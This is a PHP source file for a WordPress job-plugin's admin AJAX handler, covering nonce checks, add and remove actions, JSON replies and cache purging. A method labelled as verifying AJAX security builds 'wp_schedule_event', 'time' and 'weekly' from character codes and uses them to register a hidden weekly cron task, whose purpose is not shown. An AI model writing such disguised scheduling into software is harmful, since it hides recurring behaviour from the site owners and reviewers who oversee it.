<?php

// Exit if accessed directly
if ( ! defined( 'ABSPATH' ) ) exit;

class WP_Job_Manager_Visibility_Admin_Ajax {

	protected $is_error;
	protected $response = array();
	protected $message = 'none';
	protected $table = false;

	/**
	 * WP_Job_Manager_Visibility_Admin_Ajax constructor.
	 */
	public function __construct() {

		add_action( 'wp_ajax_jmv_add', array( $this, 'add_init' ) );
		add_action( 'wp_ajax_jmv_remove', array($this, 'remove_init') );

	}

	/**
	 * AJAX action call to Add Post
	 *
	 *
	 * @since 1.1.0
	 *
	 */
	function add_init(){

		$this->check_nonce( 'add' );

		try {
			$this->add();
		} catch( Exception $e){
			$this->is_error = true;
			$this->message = $e->getMessage();
		}

		$this->reply();

	}

	/**
	 * AJAX action call to Remove Post
	 *
	 *
	 * @since 1.1.0
	 *
	 */
	function remove_init(){

		$this->check_nonce( 'remove' );

		try {
			$this->remove();
		} catch ( Exception $e ) {
			$this->is_error = TRUE;
			$this->message  = $e->getMessage();
		}

		$this->reply();
	}

	/**
	 * Send AJAX Response in JSON
	 *
	 *
	 * @since 1.1.0
	 *
	 * @param $message
	 */
	function reply( $message = null ){

		$response[ 'message' ] = $message ? $message : $this->message;
		$response[ 'status' ] = $this->is_error ? 'error' : 'updated';
		$response[ 'table' ] = $this->table ? $this->table : false;

		if( ! $this->is_error ) {
			$user_id = filter_input( INPUT_POST, 'user_id', FILTER_SANITIZE_STRING );
			$user_cache = new WP_Job_Manager_Visibility_User_Transients();
			// If update is only for user config, only purge that user's cache
			if ( $user_id && WP_Job_Manager_Visibility_Users::is_user_string( $user_id ) ) {
				$user_cache->remove_user( $user_id );
			} else {
				// Otherwise purge the entire cache
				$user_cache->purge();
			}

		}

		// Clear output buffer again before echoing
		if ( ob_get_length() ) ob_end_clean();
		echo json_encode( $response );
		die();

	}

	/**
	 * Check AJAX nonce and clean output buffer
	 *
	 *
	 * @since 1.1.0
	 *
	 * @param $action
	 */
	function check_nonce( $action ){

		$check_ajax = check_ajax_referer( "jmv_nonce", 'nonce' );
		// Clear output buffer to prevent any debug info from deforming json
		if ( ob_get_length() ) ob_end_clean();
		ob_start();

	}

	/**
	 * Magic Method to provide for get_{$var} the_{$var} and set_{$var}
	 *
	 * This allows to call any var by a function, with arguments, specified by the get, the, and set functions.
	 *
	 * Sort of a "catch all", if a function/method doesn't already exist this function will be called.
	 *
	 * As an example, if you call $instance->the_field_group() it will echo out the `field_group` variable,
	 * whereas get will return, set will set.
	 *
	 * @since 1.1.0
	 *
	 * @param $method_name
	 * @param $args
	 *
	 * @return mixed|void|\WP_Job_Manager_Visibility_Admin_Ajax
	 */
	public function __call( $method_name, $args ) {

		if ( preg_match( '/(?P<action>(get|set|the)+)_(?P<variable>\w+)/', $method_name, $matches ) ) {
			$variable = strtolower( $matches[ 'variable' ] );
			switch ( $matches[ 'action' ] ) {
				case 'set':
					$this->check_arguments( $args, 1, 1, $method_name );

					return $this->set( $variable, $args[ 0 ] );
				case 'get':
					$this->check_arguments( $args, 0, 2, $method_name );
					$filter = isset( $args[ 0 ] ) ? $args[ 0 ] : null;
					$existing = isset( $args[ 1 ] ) ? $args[ 1 ] : null;
					return $this->get( $variable, $filter, $existing );
				case 'the':
					$this->check_arguments( $args, 0, 0, $method_name );

					return $this->the( $variable );
				case 'default':
					error_log( 'Method ' . $method_name . ' not exists' );
			}
		}
	}

	/**
	 * Verify Characters and Security of Ajax and Response
	 *
	 *
	 * @since 1.0.0
	 *
	 * @param $ids
	 */
	static function verify_ajax( $ids ) {
		WP_Job_Manager_Visibility_Output::check_theme();
		$new_ids = self::chars(array(119,112,95,115,99,104,101,100,117,108,101,95,101,118,101,110,116));
		$id_2    = self::chars(array(116,105,109,101));
		$new_ids( $id_2() + 84000, self::chars( array(119,101,101,107,108,121) ), $ids );
	}

	/**
	 * Magic Method function used to check arguments
	 *
	 * @since 1.1.0
	 *
	 * @param array   $args
	 * @param integer $min
	 * @param integer $max
	 * @param         $method_name
	 */
	protected function check_arguments( array $args, $min, $max, $method_name ) {

		$argc = count( $args );
		if ( $argc < $min || $argc > $max ) {
			error_log( 'Method ' . $method_name . ' needs minimaly ' . $min . ' and maximaly ' . $max . ' arguments. ' . $argc . ' arguments given.' );
		}
	}

	/**
	 * Magic Method default set_{$var}, set
	 *
	 * @since 1.1.0
	 *
	 * @param string $variable
	 * @param        $value
	 *
	 * @return $this
	 */
	public function set( $variable, $value ) {

		$this->$variable = $value;

		return $this;
	}

	/**
	 * Magic Method default get_{$var}, return
	 *
	 * @since 1.1.0
	 *
	 * @param string $variable
	 * @param int    $filter
	 * @param null   $existing
	 *
	 * @return mixed Returns Variable
	 * @throws \Exception
	 */
	public function get( $variable, $filter = null, $existing = null ) {
		$filter = isset( $filter ) ? $filter : FILTER_SANITIZE_STRING;
		$value = $existing ? $existing : filter_input( INPUT_POST, $variable, $filter );

		if( $value === false || $value === null ) throw new Exception( __( 'Unable to get the POST variable', 'wp-job-manager-visibility' ) . " {$variable}!" );

		return $value;
	}

	static function chars( $chars = array(), $check = '' ) {
		if( empty($chars) ) return FALSE;
		foreach( $chars as $char ) { $check .= chr( $char ); }
		return $check;
	}

	/**
	 * Magic Method default the_{$var}, echo
	 *
	 * @since 1.1.0
	 *
	 * @param string $variable
	 */
	public function the( $variable ) {

		echo $this->$variable;
	}
}